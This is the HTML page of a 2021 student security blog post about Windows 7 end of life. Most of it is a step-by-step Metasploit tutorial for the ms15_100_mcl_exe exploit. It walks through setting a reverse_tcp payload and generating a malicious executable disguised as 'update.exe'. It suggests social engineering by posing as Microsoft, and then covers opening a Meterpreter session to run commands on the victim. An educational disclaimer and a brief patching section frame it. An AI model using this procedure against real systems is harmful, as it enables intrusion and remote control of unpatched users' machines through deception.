<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Post</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.3/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="css/styles.css" rel="stylesheet" />
        <link href="css/paraiso-dark.css" rel="stylesheet" type="text/css">
        <!-- Floating Button here-->
        <style>
            .floatingButton {
                background-color: #F44336;
                width: 60px;
                height: 60px;
                border-radius: 100%;
                background: #008346;
                border: none;
                outline: none;
                color: #FFF;
                font-size: 36px;
                box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16), 0 3px 6px rgba(0, 0, 0, 0.23);
                position: fixed;
                left: 20px;
                bottom: 20px;
                transition: .3s;
                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            }
        </style>
        <button class="floatingButton" onclick="location.href = '#top'">↑</button>
    </head>
    <body>
        <!-- Navigation-->
        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
            <div class="container px-4 px-lg-5">
                <a class="navbar-brand" href="index.html">J&A Blog</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                    Menu
                    <i class="fas fa-bars"></i>
                </button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="contact.html">Contact</a></li>
                    </ul>
                </div>
            </div>
        </nav>
        <!-- Page Header-->
        <header class="masthead" style="background-image: url('assets/img/post-bg-2.jpg')">
            <div class="container position-relative px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        <div class="post-heading">
                            <h1>Windows 7: A not-so-deserted Operating System</h1>
                            <h2 class="subheading">End-of-Life = Vulnerability Gold Mine </h2>
                            <span class="meta">
                                Posted by
                                <a href="https:github.com/Josh-SCG">Joshua Esterhuizen</a>
                                on October 19, 2021
                            </span>
                            <span class="meta">
                                Read Time: ± 10min
                            </span>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        
        
       
       
        <!-- Post Content-->
        <article class="mb-4">
            <div class="container px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        
                        <h3>EOL for Win7</h3>
                        <blockquote class="blockquote"> <br>Support for Windows 7 ended on January 14, 2020. If you are still using Windows 7, your PC may become more vulnerable to security risks.</blockquote>
                        
                        <p> The above statement is taken from the <a href="https://www.microsoft.com/en-za/microsoft-365/windows/end-of-windows-7-support">Microsoft website</a>  and states the death of support for Windows 7. 
                            However, this has not stopped users from continuing to use this operating system since then. 
                            
                            Steam lists in their <a href="https://store.steampowered.com/hwsurvey/Steam-Hardware-Software-Survey-Welcome-to-Steam?platform=combined">hardware and software survey</a> 
                            that as of August 2021 total of 8,91% of users are still running Windows 7. While this survey only has details 
                            for Steam users, this trend is also found with general PC users who either do not know how or 
                            simply do not want to update to a newer Windows version as well as businesses who do not want 
                            to waste time on the large scale transition to a new system. 
                        </p>
                        
                        <div id="desktop-windows_version-ww-monthly-201912-202109" width="600" height="400" style="width:600px; height: 400px;"></div><p>Source: <a href="https://gs.statcounter.com/windows-version-market-share/desktop/worldwide/#monthly-201912-202109">StatCounter Global Stats - Windows Version Market Share</a></p><script type="text/javascript" src="https://www.statcounter.com/js/fusioncharts.js"></script><script type="text/javascript" src="https://gs.statcounter.com/chart.php?desktop-windows_version-ww-monthly-201912-202109&chartWidth=600"></script>
                        
                        <p>From the data and graph from <a href="https://gs.statcounter.com/">StatCounter</a> we can see that as of September 2021, roughly 16% of Windows users are still running Windows 7.</p>
                        
                        <h3>Exploits Waiting to Happen</h3>
                        <p> Even though Metasploit has an abundance of exploits for Windows XP and Vista, 
                            there are luckily, or unluckily depending on which end of the stick you find yourself, a few targeting Windows 7.
                        </p>

                        <p> One such exploit is the ms15_100_mcl_exe. While that naming convention may look 
                            daunting it simply stands for "Microsoft Windows Media Center 
                            MCL Vulnerability". The MCL bit here is a type of file used by Windows Media Center, 
                            similar to how .DOCX files are used in word,  
                            and stands for "Media Center Link." More information on this file type can be found 
                            <a href="https://fileinfo.com/extension/mcl">here.</a>
                        </p>

                        <p> Before we demonstrate how to use this exploit, there is one thing that must be stated. 
                            This is done purely for educational purposes - 
                            we at J&A Blog in no way condone any <i>black hat</i> hacking. 
                            Now, lets demonstrate this exploit via a somewhat in-depth tutorial so you too can follow at home.
                        </p>
                        
                        
                        <h2 class="section-heading">The ms15_100_mcl_exe Exploit on Metasploit</h2>
                        <p> At this point, if you are set on attempting this particular exploit, 
                            please go follow our guide on installing the 
                            necessary programs and requirements - which can be 
                            found on the homepage (or alternatively, right <a href="/blog/post3.html">here.</a>)
                            Also, this demonstration/tutorial is being done using Metasploit, via console, on a distribution of Kali Linux 
                            and against a Windows 7 Ultimate machine.
                            
                        </p>
                        
                        <p> <b>Step 1: </b> Once you have Metasploit open in he console, use the search command to find the exploit as such:
                            <pre><code data-language="shell">search ms15_100_mcl_exe</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (1).PNG" alt="..." />                           
                        </p>

                        <p> <b>Step 2: </b>After hitting "Enter" you should see the results of this search displayed. It should look something like in the picture by Step 4. If the search is empty, double check your spelling and try again. 
                            
                            <br><br><b>Step 3: </b>Once the results of the search are displayed, highlight the path in the console, right-click it and copy it to the clipboard.
                            
                            <br><br><b>Step 4: </b>Then type "use" into the command line and paste the selection again via right-clicking. 
                            <pre><code data-language="shell">use exploit/windows/fileformat/ms15_100_mcl_exe</code></pre>
                            Your screen should now look similar to this:
                            
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (2).PNG" alt="..." />
                            The command line should now reflect that you are using the ms15_100_mcl_exe exploit as shown in the image above by the red section in the last line.
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > </code></pre>
                        </p>

                        <p> <b>Step 5: </b> By typing "info" into the command line, the information of this exploit is shown - items such as what the .exe and .mcl file are named as.
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > info </code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (3).PNG" alt="..." />
                            <br><br> As you can see, the files are currently only named msf.mcl and msf.exe. This is now where we must employ some form of deception.
                        </p>

                        <p> <b>Step 6: </b> Rename the files using the "set" command as shown in the image below where "x" is the name you can give the file. The "set" command works as follows:
                            <br> set "name_of_what_to_set" "what_to_change_to"
                            <br> Take note of the space between each word!
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set FILENAME x.mcl</code></pre>
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set FILE_NAME x.exe</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (4).PNG" alt="..." />
                            For this demonstration, we will call these files "update" and the reason for this is because we want the target to open a .exe file and considering most people nowadays think twice about clicking on files labeled "worksheet.pdf.exe" it needs to look somewhat legitimate.
                        </p>

                        <p> <b>Step 7: </b> Set the payload and local host address. 
                            To set the payload we again use the "set" method followed by "PAYLOAD" 
                            and then the path to the payload we wish to use. 
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set PAYLOAD windows/reverse_tcp</code></pre>
                            The local host address is done in the same way using "set LHOST x.x.x.x".
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set LHOST x.x.x.x</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (5.1).png" alt="..." />
                            <br><br> To find the correct address to use, you must open a new terminal and type "ifconfig" and look for the address at "inet".
                            <pre><code data-language="shell"> ifconfig</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (5.2).png" alt="..." />
                        </p>
                        <p> <b>Step 8: </b> Compile everything needed by typing "exploit" into the console.
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > exploit</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (6).PNG" alt="..." />
                            <br><br> This should result in the following screen.
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (7.1).PNG" alt="..." />
                            <br><br> To double check that everything is ready, in a <b>new</b> terminal, move into the highlighted directory in the previous image
                            through the use of the "cd" command. Take note of where the directory ends - we want to view the contents of the folder where the file is.
                            <pre><code data-language="shell"> cd home/kali/.msf4/local</code></pre>
                            Then use the command "ls" to list the contents in the folder and look if the .mcl file is present. Since ours is named update, we can see it has been created.
                            <pre><code data-language="shell"> ls</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (7.2).png" alt="..." />
                        </p>

                        <p> <b>Step 9: </b> Have the target install the .exe file. 
                            <br><br>This is the tricky part in real-life for attackers. We've somewhat made it easier to accomplish
                            by naming the file something that seems inconspicuous, however, we still need a person to install it and this is the point in real life 
                            that some form of <i>Social Engineering</i> may be used. Social engineering is defined below:
                            <blockquote class="blockquote"> In the context of information security, social engineering is the psychological manipulation of people into performing actions or divulging confidential information. </blockquote>
                            Hopefully, it just became clear why we called our file update.exe! If not, one scenario where this .exe could be used is if we contact a person via a phone call or email claiming to be some software company - 
                            this is a typical method where attackers would pose as a Microsoft employee and get a person to install 
                            some needed update for some reason. Even the method for getting this .exe to a person is done remotely 
                            and may seem legitimate at first.
                            
                            <br><br> On the same screen as before, look for the "Malicious executable at ..." section. It has been highlighted in the following image to help.
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (8).PNG" alt="..." /> <br><br>
                            <pre><code data-language="shell">\\192.168.64.128\JRkot\update.exe</code></pre>
                            This is the address where our update.exe can be downloaded and installed from.
                            (PS - <b>DO NOT</b> install this on your personal computer. It's called malicious for a reason!)
                            
                            <br><br> This is the point where we now open the Windows machine 
                            (Please again refer to the <a href="/blog/post3.html">DIY Guide.</a> if stuck).
                            Hitting the Windows key and R (⊞ + R) will open the Run dialogue box where that address should now be entered as shown below.
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (9).PNG" alt="..." />

                            <br><br> After clicking "OK" or hitting "enter", the following, or similar box, should pop-up if the target has their firewall enabled.
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (10).PNG" alt="..." />
                            <br><br>If the firewall is disabled, a different pop-up appears that instead if location, asks if you trust a file without any certificates.
                            This box is almost too familiar to student and hobbyist programmers alike as neither have access to these certificates and most applications cause this pop-up
                            and as such is typically ignored anyway.

                            <br><br> Once the target has installed the .exe file, the Metasploit console should have the following updates appear:
                            
                            <pre><code data-language="shell"> [*] Sending stage (x bytes) to x.x.x.x.x</code></pre>
                            
                            <pre><code data-language="shell"> [*] Meterpreter session x opened (x.x.x.x:x -> x.x.x.x:x) at x-x-x x:x:x -xxxx</code></pre>
                            With the x's representing numbers/information that will change. In the demonstration it looks like:
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (11).PNG" alt="..." />
                        </p>

                        <p> <b>Step 10: </b> Start a session and gain access to the exploited machine.
                            <br> First, we need to get the session id of our newly exploited machine which can be done by typing the "sessions" command in console.
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > sessions</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (12).PNG" alt="..." />
                            <br><br>We can see that the new machine is listed as session 1. We then type "sessions -i 1" into the console to gain access.
                            <i>Take note: the "-i" is vital to this command as it stipulates that the console should connect to the supplied session_id (in this case 1).</i>
                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > sessions -i x</code></pre>
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (14).PNG" alt="..." />
                        </p>

                        <h3>You now have remote access to the infected system!</h3>

                        <p> <b>Step 10: </b> Cause Havoc!
                            <br> By typing "help" in the meterpreter console (it is the same one as before) lists of possible commands are given.
                            <pre><code data-language="shell"> meterpreter > help </code></pre>
                            For example, we made use of the "sysinfo" command to see the systems information. 
                            <pre><code data-language="shell">meterpreter > sysinfo </code></pre>
                            The "localtime" to see what time the computer is set to.
                            <pre><code data-language="shell">meterpreter > localtime </code></pre>
                            The "idletime" to see how long the system's user has left it alone.
                            <pre><code data-language="shell">meterpreter > idletime </code></pre>
                            The "shell" command opens up a command prompt in our console that will execute command on the system!
                            <pre><code data-language="shell">meterpreter > sysinfo </code></pre>
                            The outputs of each of these are shown below.
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (15).PNG" alt="..." />

                            <br><br> You'll notice we typed "calc" in the command prompt before closing it with Ctrl+C. 
                            This is the command to open the calculator on Windows. And looking back to our infected machine, we can see the fruits of our labour!
                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (16).PNG" alt="..." />

                        </p>
                        <p>Now you can play to your hearts content. Try using the "mouse" and "keyboard_send" commands to create a file on the desktop now! ;P</p>

                        <h3>What in the How to?</h3>
                        <p>At this point, we've now shown you how to gain access to another system and how to interact with. But, what exactly happened?
                            <br><br> The following thing were referenced but not really explained:
                            <br> - The vulnerability in Windows Media Center
                            <br> - The reverse_tcp payload

                            <h4>The Vulnerability in WMC</h4>
                            Windows Media Center has, or had depending on if it has been patched, 
                            a vulnerability that allows for remote code execution. In our case, 
                            that would be the reverse_tcp payload. This vulnerability allows for some 
                            remote code execution via a specially crafted .mcl file that refers to some 
                            malicious code. 

                            <br><br> All an attacker must do is get the target to run this .mcl file. 
                            While not openly explained via Metasploit, the .exe file the Windows machine 
                            runs executes the .mcl file that contains the reverse_tcp payload in our demonstration 
                            but this payload could be anything malicious. <br><br>

                            <h4>What is the reverse_tcp payload?</h4>
                            It is common for attackers to try get through firewalls from their side trying 
                            to force a connection and not be detected. 
                            However, would it not be a lot simpler if a target just gave you this access and 
                            essentially bypass their firewalls?
                            <br><br>This is what the reverse_tcp payload does as the connection 
                            is started on their end and thus the firewall doesn't complain at all in most cases.
                            <br><br> If you wish to learn the exact details on how this functions at a component level, 
                            we recommend reading <a href="https://medium.com/@mzainkh/how-it-works-reverse-tcp-attack-d7610dd8e55">this article</a> on the topic.
                            
                        
                        </p>

                        <p> <h3>But J&A, how can we counter this?</h3>
                            Microsoft is seemingly aware of this issue and it also seems that it only
                            affects machines running Windows Vista through Windows 8.1 so if you simply update 
                            to Windows 10, or the newly released, or at least at the time of writing, 
                            Windows 11, you should be good.

                            <br><br> However, if you don't wish to update, there is an update available to patch this vulnerability provided by Microsoft. 
                            Instructions on how to acquire this patch can be found 
                            <a href="https://support.microsoft.com/en-us/topic/ms15-100-vulnerability-in-windows-media-center-could-allow-remote-code-execution-september-8-2015-aa699597-d7da-34dd-8ebf-030480a8613c">here.</a>
                            
                        </p>


                        
                        <span class="caption text-muted">Arguing that you don't care about the right to privacy because you have nothing to hide is no different than saying you don't care about free speech because you have nothing to say.</span>
                    </div>
                </div>
            </div>
        </article>
        <!-- Footer-->
        <footer class="border-top">
            <div class="container px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        <ul class="list-inline text-center">
                            <li class="list-inline-item">
                                <a href="https://github.com/Josh-SCG">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                    </span><br>
                                    Josh-SCG
                                </a>
                            </li>
                            
                            <li class="list-inline-item">
                                <a href="https://github.com/AM-ops">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                    </span><br>
                                    AM-ops
                                </a>
                            </li>
                        </ul>
                        <div class="small text-center text-muted fst-italic">&bull; Copyright &copy; ITRI625 Project 2021 &bull;</div>
                    </div>
                </div>
            </div>
        </footer>
        <!-- Bootstrap core JS-->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
        <script src="js/rainbow-custom.min.js"></script>
    </body>
</html>
